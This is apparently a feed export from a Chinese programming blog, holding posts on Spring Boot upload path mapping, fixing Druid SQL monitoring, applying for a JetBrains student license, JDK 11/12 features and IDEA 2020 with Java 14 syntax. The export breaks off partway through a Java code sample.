        <content type="html"><![CDATA[<h2 id="实训"><a href="#实训" class="headerlink" title="实训"></a>实训</h2><p>最近大三下半学期刚刚结束，打算用实训记录类标题记录一下自己实训开发中遇到的一些问题。这次实训由京东互联网科技实践中心的老师授课并且给与我们开发小组达到毕设水平的评价，不知后续参加工作后看大学中开发的项目会有一些什么样的感受。项目后续上传到github上，个人负责建筑奖项参评平台用户操作系统开发，管理员与评审专家系统由其他组员开发。</p><h2 id="实训问题——thymeleaf传值给外联js文件"><a href="#实训问题——thymeleaf传值给外联js文件" class="headerlink" title="实训问题——thymeleaf传值给外联js文件"></a>实训问题——thymeleaf传值给外联js文件</h2><p>这次实训中后端业务逻辑、架构、数据库操作没有太大阻力，由于个人前端技术较差，主要问题集中于前端模板与后端的交互。这篇文介绍虚拟路径映射问题，在项目需求分析中为满足用户操作平台中用户账号上传、更换头像并实时显示的问题，springboot开发须配置使用虚拟路径映射完成功能。<br><img src="/img/design20/images.PNG" alt="虚拟路径映射"> </p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>解决思路：@Configuration定义配置类，继承WebMvcConfigurationSupport类配置虚拟路径。<br>项目实例见下方代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">@Configuration</span><br><span class="line">public class UploadConfiguration extends WebMvcConfigurationSupport  &#123;</span><br><span class="line">    @Override</span><br><span class="line">    protected void addResourceHandlers(ResourceHandlerRegistry registry) &#123;</span><br><span class="line">        registry.addResourceHandler(<span class="string">"/upload/**"</span>)//这个是虚拟路径图片路径</span><br><span class="line">                .addResourceLocations(<span class="string">"file:E:/upload/img/"</span>);//这个是图片真实路径</span><br><span class="line">        super.addResourceHandlers(registry);</span><br><span class="line">        registry.addResourceHandler(<span class="string">"/**"</span>).addResourceLocations(<span class="string">"classpath:/static/"</span>);//项目内的图片去static下找</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> 虚拟路径 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> springboot </tag>
            
            <tag> 虚拟路径 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Druid的sql数据监控没有数据</title>
      <link href="/2020/04/30/Druid%E7%9A%84sql%E6%95%B0%E6%8D%AE%E7%9B%91%E6%8E%A7%E6%B2%A1%E6%9C%89%E6%95%B0%E6%8D%AE/"/>
      <url>/2020/04/30/Druid%E7%9A%84sql%E6%95%B0%E6%8D%AE%E7%9B%91%E6%8E%A7%E6%B2%A1%E6%9C%89%E6%95%B0%E6%8D%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="Druid无sql数据监控"><a href="#Druid无sql数据监控" class="headerlink" title="Druid无sql数据监控"></a>Druid无sql数据监控</h2><p>在使用springboot集成Druid数据源时遇到了一直监控不到sql数据问题<br>问题情形如下：<br><img src="/img/Druid/druid1.PNG" alt=""><br><img src="/img/Druid/druid2.PNG" alt=""><br><img src="/img/Druid/druid3.PNG" alt=""><br>可以发现filter类名下为空，查看配置问题</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>可能原因：<br>(1)config下的filter方法没添加@Bean<br>(2)filters没配置</p><p>(1)的解决方案不做赘述。<br>(2)的解决方案：<br>打开resources目录下配置文件添加配置<br>.yml格式：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">spring:</span><br><span class="line">  datasource:</span><br><span class="line">    username: xxxx</span><br><span class="line">    password: xxxx</span><br><span class="line">    url: jdbc:mysql://localhost:3306/mybatis?serverTimezone=UTC&amp;useUnicode=<span class="literal">true</span>&amp;characterEncoding=utf-8</span><br><span class="line">    driver-class-name: com.mysql.cj.jdbc.Driver</span><br><span class="line">    <span class="built_in">type</span>: com.alibaba.druid.pool.DruidDataSource</span><br><span class="line">    filters: <span class="built_in">stat</span></span><br></pre></td></tr></table></figure><br>.properties:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">spring.datasource.druid.driver-class-name=com.mysql.cj.jdbc.Driver</span><br><span class="line">spring.datasource.druid.url=jdbc:mysql://localhost:3306/mybatis?serverTimezone=UTC&amp;useUnicode=<span class="literal">true</span>&amp;characterEncoding=utf-8</span><br><span class="line">spring.datasource.druid.username=xxxx</span><br><span class="line">spring.datasource.druid.password=xxxx</span><br><span class="line">spring.datasource.druid.filters=<span class="built_in">stat</span></span><br></pre></td></tr></table></figure><br>解决后截图：<br><img src="/img/Druid/druid4.PNG" alt=""><br><img src="/img/Druid/druid5.PNG" alt="">    </p>]]></content>
      
      
      <categories>
          
          <category> Druid </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Druid </tag>
            
            <tag> alibaba.druid </tag>
            
            <tag> springboot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDEA旗舰版学生党如何获得免费的个人许可证</title>
      <link href="/2020/04/21/IDEA%E6%97%97%E8%88%B0%E7%89%88%E5%AD%A6%E7%94%9F%E5%85%9A%E5%A6%82%E4%BD%95%E8%8E%B7%E5%BE%97%E5%85%8D%E8%B4%B9%E7%9A%84%E4%B8%AA%E4%BA%BA%E8%AE%B8%E5%8F%AF%E8%AF%81-1/"/>
      <url>/2020/04/21/IDEA%E6%97%97%E8%88%B0%E7%89%88%E5%AD%A6%E7%94%9F%E5%85%9A%E5%A6%82%E4%BD%95%E8%8E%B7%E5%BE%97%E5%85%8D%E8%B4%B9%E7%9A%84%E4%B8%AA%E4%BA%BA%E8%AE%B8%E5%8F%AF%E8%AF%81-1/</url>
      
        <content type="html"><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>版本：<code>Ultimate</code> | <code>Community Edition</code><br>        旗舰版    社区版本<br>为什么我要使用旗舰版的IDEA？请看官方比较：<a href="https://www.jetbrains.com/idea/features/editions_comparison_matrix.html" target="_blank" rel="noopener">https://www.jetbrains.com/idea/features/editions_comparison_matrix.html</a><br>旗舰版还支持HTML，CSS，PHP，SQL，Python等语言，并且支持更多的服务端框架和前端框架例如：Spring、Spring Cloud、Java EE、Micronaut, Quarkus, Helidon、Grails、Node.js、Django等，还有服务器部署例如：Tomcat、TomEE、JBoss, WildFly、GlassFish、Resin等，而社区版只支持Docker。相对于社区版本，旗舰版还有更多的分析工具，因此我选择旗舰版IDEA，如果学生教师想要使用旗舰版的IDEA又不想官方购买怎么办？下面我教大家获取免费的个人许可证。</p><h2 id="1-到学信网申请在线认证报告"><a href="#1-到学信网申请在线认证报告" class="headerlink" title=".1.到学信网申请在线认证报告"></a>.1.到学信网申请在线认证报告</h2><p><a href="https://www.chsi.com.cn/" target="_blank" rel="noopener">https://www.chsi.com.cn/</a> 进入后用自己身份证登录，点击<code>学籍查询</code>，进入后点击<code>在线验证报告</code>下方的<code>申请</code>，点击教育部学籍<code>在线验证报告</code>下的<code>查看</code>：然后申请就好，申请完后点击<code>查看</code>，即可看到本人的学籍信息页面，接着点击<code>PDF下载</code>，然后复制当前网址放在记事本以备后面所需。<br><img src="/img/idea/idea_1.jpg" alt=""><br><img src="/img/idea/idea_2.jpg" alt=""><br><img src="/img/idea/idea_3.jpg" alt=""><br><img src="/img/idea/idea_4.jpg" alt=""><br><img src="/img/idea/idea_5.jpg" alt=""></p><h2 id="2-到JetBrains官网进行学生认证"><a href="#2-到JetBrains官网进行学生认证" class="headerlink" title=".2.到JetBrains官网进行学生认证"></a>.2.到JetBrains官网进行学生认证</h2><p><a href="https://www.jetbrains.com/shop/eform/students" target="_blank" rel="noopener">https://www.jetbrains.com/shop/eform/students</a><br>进入后如下图对照填写：<br>官方文件即为刚下载的pdf文件。证明你与你的学术机构有隶属的正式文件链接就写刚复制的，就是学信网认证后的那个页面地址。填写完后点击申请，时间为人工审核4-7天并以填写的邮件地址给你回复。</p><p><img src="/img/idea/idea_6.jpg" alt=""><br><img src="/img/idea/idea_7.jpg" alt=""></p><h2 id="3-成功收到审核成功的通知"><a href="#3-成功收到审核成功的通知" class="headerlink" title=".3.成功收到审核成功的通知"></a>.3.成功收到审核成功的通知</h2><p>jetbrains官方审核成功后会给你的来信如下图，你需要点击<code>link your free license</code>，然后下方<code>Create JetBrains Account</code>创建一个账号密码，输入你的邮箱，点击<code>Sign Up</code>注册jetbrains官方账号，进去后填写密码及可绑定该许可证。<br>至此就免费的获得了个人许可证，下载IDEA开始你的代码之旅吧。<br><img src="/img/idea/idea_8.jpg" alt=""><br><img src="/img/idea/idea_9.jpg" alt=""><br><img src="/img/idea/idea_10.jpg" alt=""></p><p>本文为转载<br>IDEA旗舰版学生党如何获得免费的个人许可证由<a href="https://yoyling.com/author/1/" target="_blank" rel="noopener">YOYLING.</a>创作,点击作者名称进入作者主页。</p>]]></content>
      
      
      <categories>
          
          <category> IDEA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IDEA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jdk11新特性</title>
      <link href="/2020/04/21/jdk11%E6%96%B0%E7%89%B9%E6%80%A7/"/>
      <url>/2020/04/21/jdk11%E6%96%B0%E7%89%B9%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<p>这日子过着过着jdk14都发布了，刚起步用jdk11的我瑟瑟发抖，打算记录一下。<br><img src="/img/jdk14.PNG" alt=""></p><h2 id="Java11-vs-Java8"><a href="#Java11-vs-Java8" class="headerlink" title="Java11 vs Java8"></a>Java11 vs Java8</h2><p><img src="/img/jdk11/jdk11_1.jpg" alt=""><br>Java 11相对于Java 8确实有一部分进化，除了有很多内部的升级（比如开销和时延更低的<br>GC、TLS1.3加持等等）之外，对于初学使用者来说也有一些语言使用层面的进化。<br>正好最近我在自己的个人小项目上尝试升级使用了一下 Java11（公司项目咱也不敢动、也不<br>敢问，只好动自己的个人项目），因此本文从实际代码编写角度来大致体验一下我个人使用<br>Java11之后相对 Java8所感觉到的一些比较深刻的进化，官方文档里说得也非常清楚了：<br><a href="https://docs.oracle.com/en/java/javase/11/" target="_blank" rel="noopener">https://docs.oracle.com/en/java/javase/11/</a><br>我这次实验装的 Java11版本是 11.0.6：<br><img src="/img/jdk11/jdk11_2.jpg" alt=""><br>下文将要实验验证的一些新特性其实也并非 147 Java11才引入，很多其实在 Java9和 Java10时<br>就已经引入，只不过到了 Java11这个稳定版才沉淀下来。</p><h2 id="变量类型推断"><a href="#变量类型推断" class="headerlink" title="变量类型推断"></a>变量类型推断</h2><p>新版Java引入了一个全新的类型关键字 var，用 var来定义的变量不用写具体类型，编译器能<br>根据 =右边的实际赋值来自动推断出变量的类型：<br>1、普通局部变量<br><img src="/img/jdk11/jdk11_3.jpg" alt=""><br>怎么样？是不是有一种在使用类似JavaScript这种弱类型语言的错觉？</p><p>2、for循环中使用<br><img src="/img/jdk11/jdk11_4.jpg" alt=""></p><p>这地方就能看出用 var定义局部变量的优势了，假如这个例子中集合里的元素类型更为复杂，<br>是类似 List<List<String>&gt;这种嵌套类型的话， var定义就非常简洁明了！</p><p>3、当然，有些情况是不能使用的<br>var类型变量一旦赋值后，重新赋不同类型的值是不行的，比如：<br><img src="/img/jdk11/jdk11_5.jpg" alt=""></p><p>定义 var类型变量没有初始化是不行的，比如：<br><img src="/img/jdk11/jdk11_6.jpg" alt=""><br>另外，像类的 成员变量类型、 方法入参类型、 返回值类型等是不能使用 var的，比如：<br><img src="/img/jdk11/jdk11_7.jpg" alt=""></p><h2 id="官方HTTP-Client加持"><a href="#官方HTTP-Client加持" class="headerlink" title="官方HTTP Client加持"></a>官方HTTP Client加持</h2><p>是的！<br>现在 JDK官方就自带 HTTPClient了，位于 java.net.http包下，支持发送同步、异步的 HTTP请<br>求，这样一来，以前咱们常用的HTTP请求客户端诸如： OKHttp、 HttpClient这种现在都可以<br>退下了！<br>发送同步请求：<br><img src="/img/jdk11/jdk11_8.jpg" alt=""><br>发送异步请求：<br><img src="/img/jdk11/jdk11_9.jpg" alt=""><br>当然你也可以自定义请求头，比如携带 JWT Token权限信息去请求等：<br><img src="/img/jdk11/jdk11_10.jpg" alt=""></p><h2 id="String处理增强"><a href="#String处理增强" class="headerlink" title="String处理增强"></a>String处理增强</h2><p>新版字符串 String类型增加了诸如： isBlank()、 strip()、 repeat()等方便的字符串处理方<br>法<br><img src="/img/jdk11/jdk11_11.jpg" alt=""></p><h2 id="集合增强"><a href="#集合增强" class="headerlink" title="集合增强"></a>集合增强</h2><p>主要是增加了诸如 of()和 copyOf()等方法用于更加方便的创建和复制集合类型<br><img src="/img/jdk11/jdk11_12.jpg" alt=""></p><h2 id="函数式编程增强"><a href="#函数式编程增强" class="headerlink" title="函数式编程增强"></a>函数式编程增强</h2><p>我印象最深的是对 Stream流增加了诸如 takeWhile()和 dropWhile()的截止结算方法：<br><img src="/img/jdk11/jdk11_13.jpg" alt=""></p><h2 id="文件读写增强"><a href="#文件读写增强" class="headerlink" title="文件读写增强"></a>文件读写增强</h2><h3 id="1、Files类增强"><a href="#1、Files类增强" class="headerlink" title="1、Files类增强"></a>1、Files类增强</h3><p>我们以前心心念的直接能把文件内容读取到 String以及 String回写到文件的功能终于支持了,<br>可以通过 Files类的静态方法 writeString()和 readString()完成：<br><img src="/img/jdk11/jdk11_14.jpg" alt=""></p><h3 id="2、InputStream增强"><a href="#2、InputStream增强" class="headerlink" title="2、InputStream增强"></a>2、InputStream增强</h3><p>InputStream则增加了一个 transferTo()方法，直接将数据丢到 OutputStream去：<br><img src="/img/jdk11/jdk11_15.jpg" alt=""></p><h2 id="支持源文件直接运行-666！"><a href="#支持源文件直接运行-666！" class="headerlink" title="支持源文件直接运行(666！)"></a>支持源文件直接运行(666！)</h2><p>比如写一个最简单的 Hello World程序：<br><img src="/img/jdk11/jdk11_16.jpg" alt=""><br>并保存为 hello.java文件，这时候可以直接用 java指令去运行这个Java源文件，直接省去以<br>前 javac编译源文件的过程：<br><img src="/img/jdk11/jdk11_17.jpg" alt=""><br><img src="/img/jdk11/jdk11_18.jpg" alt=""><br>怎么样？是不是和python源文件的运行有点像？这个信息量就有点大了，大家可以自行脑补<br>一下</p><h2 id="小-结"><a href="#小-结" class="headerlink" title="小 结"></a>小 结</h2><p>Java 11确有很多改进，但还是那句话，对于初学者来说Java 8足够啦，没必要刻意求新，稳<br>才是最重要的！</p><p>转载的原文地址：<a href="https://www.bilibili.com/read/cv5037646" target="_blank" rel="noopener">https://www.bilibili.com/read/cv5037646</a></p>]]></content>
      
      
      <categories>
          
          <category> jdk </category>
          
      </categories>
      
      
        <tags>
            
            <tag> jdk </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jdk12新特性</title>
      <link href="/2020/04/21/jdk12%E6%96%B0%E7%89%B9%E6%80%A7/"/>
      <url>/2020/04/21/jdk12%E6%96%B0%E7%89%B9%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<p>这日子过着过着jdk14都发布了，刚起步用jdk11的我瑟瑟发抖，打算记录一下。<br><img src="/img/jdk14.PNG" alt="官网"></p><h2 id="低暂停延时的垃圾收集器-实验版"><a href="#低暂停延时的垃圾收集器-实验版" class="headerlink" title="低暂停延时的垃圾收集器 (实验版)"></a>低暂停延时的垃圾收集器 (实验版)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A Low-Pause-Time Garbage Collector (Experimental)</span><br></pre></td></tr></table></figure><p>添加一个名为 Shenandoah的新垃圾收集 (GC)算法，该算法通过与正在运行的 Java线程并发执行回收工作来减少 GC暂停时间。Shenandoah的暂停时间与堆大小无关，这意味着无论堆大小是 200MB 还是 200GB，都将拥有相同的暂停时间。</p><h2 id="微基准测试套件"><a href="#微基准测试套件" class="headerlink" title="微基准测试套件"></a>微基准测试套件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Microbenchmark Suite</span><br></pre></td></tr></table></figure><p>在 JDK源代码中添加了一组基本的微基准测试套件，使得开发人员无论运行现有的微基准测试或者创建新的微基准测试都变得十分便利。</p><h2 id="Switch-表达式-预览版"><a href="#Switch-表达式-预览版" class="headerlink" title="Switch 表达式 (预览版)"></a>Switch 表达式 (预览版)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Switch Expressions (Preview)</span><br></pre></td></tr></table></figure><p>这是一个预览版语言特性。通过对 switch语法进行了扩展，使其不仅可以作为语句（statement），还可以作为表达式（expression），并且两种形式都可以使用“传统的”或“简化的”语法用于作用于不同的范围或者控制执行流。这些更改将会简化日常编码，并且为在 switch中使用模式匹配 (JEP 305) 做好了准备。</p><h2 id="JVM-常量API"><a href="#JVM-常量API" class="headerlink" title="JVM 常量API"></a>JVM 常量API</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JVM Constants API</span><br></pre></td></tr></table></figure><p>引入一个API来建模关键类文件（key class-file）和运行时构件（run-time artifacts）的标称描述，特别是对那些可从常量池加载的常量。</p><h2 id="仅保留-AArch64-实现"><a href="#仅保留-AArch64-实现" class="headerlink" title="仅保留 AArch64 实现"></a>仅保留 AArch64 实现</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">One AArch64 Port, Not Two</span><br></pre></td></tr></table></figure><p>删除与 arm64实现相关的所有源代码，同时保留 32-bit ARM和 64-bit aarch64实现。删除这些实现是为了让所有代码贡献者集中精力于一个实现上，从而消除维护两个实现所需付出的重复工作。</p><h2 id="默认类数据共享归档文件"><a href="#默认类数据共享归档文件" class="headerlink" title="默认类数据共享归档文件"></a>默认类数据共享归档文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Default CDS Archives</span><br></pre></td></tr></table></figure><p>增强 JDK构建过程，在 64位平台上使用默认的类列表生成类数据共享(class data-sharing，CDS)存档。</p><h2 id="可中断的-G1-Mixed-GC"><a href="#可中断的-G1-Mixed-GC" class="headerlink" title="可中断的 G1 Mixed GC"></a>可中断的 G1 Mixed GC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Abortable Mixed Collections for G1</span><br></pre></td></tr></table></figure><p>如果 Mixed GC 的 G1 存在超出暂停目标的可能性，则使其可被中止。</p><h2 id="G1未使用分配内存即时返回"><a href="#G1未使用分配内存即时返回" class="headerlink" title="G1未使用分配内存即时返回"></a>G1未使用分配内存即时返回</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Promptly Return Unused Committed Memory from G1</span><br></pre></td></tr></table></figure><p>增强 G1垃圾收集器，以便在空闲时自动将 Java 堆内存返回给操作系统。</p>]]></content>
      
      
      <categories>
          
          <category> jdk </category>
          
      </categories>
      
      
        <tags>
            
            <tag> jdk </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDEA 2020、Java14升级体验</title>
      <link href="/2020/04/21/IDEA%202020%E5%8D%87%E7%BA%A7%E4%BD%93%E9%AA%8CJava14/"/>
      <url>/2020/04/21/IDEA%202020%E5%8D%87%E7%BA%A7%E4%BD%93%E9%AA%8CJava14/</url>
      
        <content type="html"><![CDATA[<h2 id="IntelliJ-IDEA2020"><a href="#IntelliJ-IDEA2020" class="headerlink" title="IntelliJ IDEA2020"></a>IntelliJ IDEA2020</h2><p>就在前几天，Java软件开发神器 IDEA 2020.1 新版发布了：<br><img src="/img/IDEA2020/IDEA2020_1.jpg" alt=""><br>我第一时间在机子上更新并体验了几天，感觉还是有点香的！怎么硕呢，体验完新特性之后，不由的感叹一句：IDEA现在真的是越来越智能，越来越懂开发者了。</p><h2 id="UI-界面升级"><a href="#UI-界面升级" class="headerlink" title="UI/界面升级"></a>UI/界面升级</h2><h3 id="1、界面支持中文了"><a href="#1、界面支持中文了" class="headerlink" title="1、界面支持中文了"></a>1、界面支持中文了</h3><p>汉化后的效果就是这个样子：<br><img src="/img/IDEA2020/IDEA2020_2.jpg" alt=""><br>各花入各眼，好坏就不做评判了，可以根据自己的喜好来调节。</p><p>必须要说的是，这个中文汉化不是软件原生支持，而是需要下载安装一个名为<code>Chinese (Simplified) Language Pack</code>的插件，好在这个插件就是<code>JetBrains</code>官方提供的<br><img src="/img/IDEA2020/IDEA2020_3.jpg" alt=""></p><h3 id="2、导航栏进化"><a href="#2、导航栏进化" class="headerlink" title="2、导航栏进化"></a>2、导航栏进化</h3><p>现在代码层级导航栏这里，可以直接定位到文件中的某个具体方法或者字段了，这个的确很高效<br><img src="/img/IDEA2020/IDEA2020_4.jpg" alt=""></p><h3 id="3、支持编辑器内的Javadocs渲染"><a href="#3、支持编辑器内的Javadocs渲染" class="headerlink" title="3、支持编辑器内的Javadocs渲染"></a>3、支持编辑器内的<code>Javadocs</code>渲染</h3><p><img src="/img/IDEA2020/IDEA2020_5.jpg" alt=""><br>渲染后的<code>Javadoc</code>就非常直观易读了，而且还可以调整字号<br><img src="/img/IDEA2020/IDEA2020_6.jpg" alt=""></p><h3 id="4、新增主题和字体"><a href="#4、新增主题和字体" class="headerlink" title="4、新增主题和字体"></a>4、新增主题和字体</h3><p>首先默认支持了JetBrains自家的新JetBrains<br><img src="/img/IDEA2020/IDEA2020_7.jpg" alt=""><br>然后则是采用了统一的<code>IntelliJ Light</code>主题，而且该主题已经在不同的操作系统中完全统一了<br><img src="/img/IDEA2020/IDEA2020_8.jpg" alt=""><br><img src="/img/IDEA2020/IDEA2020_9.jpg" alt=""><br>喜不喜欢看大家个人习惯了</p><h3 id="5、船新的LightEdit模式"><a href="#5、船新的LightEdit模式" class="headerlink" title="5、船新的LightEdit模式"></a>5、船新的LightEdit模式</h3><p><code>LightEdit</code>，顾名思义，轻量级的代码编辑。</p><p>是的，这次更新的IDEA支持打开单个代码文件进行编辑，而无需打开整个项目。文件可以在单独的编辑窗口打开，而且该窗口可以和其他（项目）窗口共存。就像这样：<br><img src="/img/IDEA2020/IDEA2020_10.jpg" alt=""><br>更强大的是，直接支持快捷打开这个单文件所在的完整项目：<br><img src="/img/IDEA2020/IDEA2020_11.jpg" alt=""><br>甚至还可以通过命令行来打开单文件，这相当可以了：<br><img src="/img/IDEA2020/IDEA2020_12.jpg" alt=""></p><h3 id="6、支持“禅”模式"><a href="#6、支持“禅”模式" class="headerlink" title="6、支持“禅”模式"></a>6、支持“禅”模式</h3><p>现在的这个代码展示模式有够丰富了，支持四种了：<br><img src="/img/IDEA2020/IDEA2020_13.jpg" alt=""><br>当然，禅模式是最彻底的，一开这个模式，整个世界都清净了…<br><img src="/img/IDEA2020/IDEA2020_14.jpg" alt=""></p><h3 id="7、终端支持分栏了"><a href="#7、终端支持分栏了" class="headerlink" title="7、终端支持分栏了"></a>7、终端支持分栏了</h3><p>现在可以随意地将IDEA自带的终端进行横竖分栏，非常方便<br><img src="/img/IDEA2020/IDEA2020_15.jpg" alt=""></p><h2 id="支持直接IDEA里安装JDK和Git"><a href="#支持直接IDEA里安装JDK和Git" class="headerlink" title="支持直接IDEA里安装JDK和Git"></a>支持直接IDEA里安装JDK和Git</h2><p>很多小伙伴交流说自己JDK环境好像装的有问题，实验各种出问题。为了这个事，强迫症都快犯了，很烦。</p><p>从IntelliJ IDEA 2020.1开始，我们可以直接在创建项目时，直接从IDEA上下载并设置JDK环境，很方便了。</p><p>我特地实验了一下，在IDEA里面下载安装了个Open JDK 14，没毛病，好用，切换也很方便。<br><img src="/img/IDEA2020/IDEA2020_16.jpg" alt=""><br><img src="/img/IDEA2020/IDEA2020_17.jpg" alt=""><br>除此之外，IDEA还直接支持Git的安装，i了i了<br><img src="/img/IDEA2020/IDEA2020_18.jpg" alt=""></p><h2 id="支持Java-14新特性"><a href="#支持Java-14新特性" class="headerlink" title="支持Java 14新特性"></a>支持Java 14新特性</h2><p>前段时间Java 14发布，加入了一些新特性，这次IDEA 2020.1迅速跟进，支持了Java 14的一些新特性，举两个典型的例子。</p><h3 id="1、instanceof用法增强"><a href="#1、instanceof用法增强" class="headerlink" title="1、instanceof用法增强"></a>1、<code>instanceof</code>用法增强</h3><p>老的Java版本中，对于instanceof语法，我们一般都是这样用的：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">private void <span class="built_in">test</span>( Object obj ) &#123;</span><br><span class="line">    <span class="keyword">if</span>( obj instanceof String  ) &#123;</span><br><span class="line">        String str = (String) obj;  // 需手动强制转换！</span><br><span class="line">        System.out.println( str.isEmpty() );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>而Java 14对<code>instanceof</code>用法做了增强，我们借助全新的IDEA 2020，可以快捷的将上面的代码自动重构成如下所示：<br><img src="/img/IDEA2020/IDEA2020_19.jpg" alt=""><br>所以最终变成了这个亚子：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">private void <span class="built_in">test</span>( Object obj ) &#123;</span><br><span class="line">    <span class="keyword">if</span>( obj instanceof String str ) &#123; // 校验通过，直接后面定义变量，无需强转！</span><br><span class="line">        System.out.println( str.isEmpty() );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="2、record新语法支持"><a href="#2、record新语法支持" class="headerlink" title="2、record新语法支持"></a>2、record新语法支持</h3><p>Java 14新增了record新语法，record的词面意思就是 “记录”，主要用于形式化的固定记录，这在以前主要就是通过 不可变类来实现的，举个例子吧。</p><p>比如我们定义一个不可变的日志记录类LogRecord，里面包含日志ID（id），日志时间（date），日志详情（detail），按照老的做法，只能使用class进行定义：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">public final class LogRecord &#123; // 不可变类</span><br><span class="line"></span><br><span class="line">    private final int id;</span><br><span class="line">    private final LocalDate date;</span><br><span class="line">    private final String detail;</span><br><span class="line"></span><br><span class="line">    public LogRecord(int id, LocalDate date, String detail) &#123;</span><br><span class="line">        this.id = id;</span><br><span class="line">        this.date = date;</span><br><span class="line">        this.detail = detail;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public int <span class="function"><span class="title">getId</span></span>() &#123;</span><br><span class="line">        <span class="built_in">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public LocalDate <span class="function"><span class="title">getDate</span></span>() &#123;</span><br><span class="line">        <span class="built_in">return</span> date;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String <span class="function"><span class="title">getDetail</span></span>() &#123;</span><br><span class="line">        <span class="built_in">return</span> detail;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String <span class="function"><span class="title">toString</span></span>() &#123;</span><br><span class="line">        <span class="built_in">return</span> <span class="string">"LogRecord&#123;"</span> +</span><br><span class="line">                <span class="string">"id="</span> + id +</span><br><span class="line">                <span class="string">", date="</span> + date +</span><br><span class="line">                <span class="string">", detail='"</span> + detail + <span class="string">'\'</span><span class="string">' +</span></span><br><span class="line"><span class="string">                '</span>&#125;<span class="string">';</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    @Override</span></span><br><span class="line"><span class="string">    public boolean equals(Object o) &#123;</span></span><br><span class="line"><span class="string">        if (this == o) return true;</span></span><br><span class="line"><span class="string">        if (o == null || getClass() != o.getClass()) return false;</span></span><br><span class="line"><span class="string">        LogRecord logRecord = (LogRecord) o;</span></span><br><span class="line"><span class="string">        return id == logRecord.id &amp;&amp;</span></span><br><span class="line"><span class="string">                Objects.equals(date, logRecord.date) 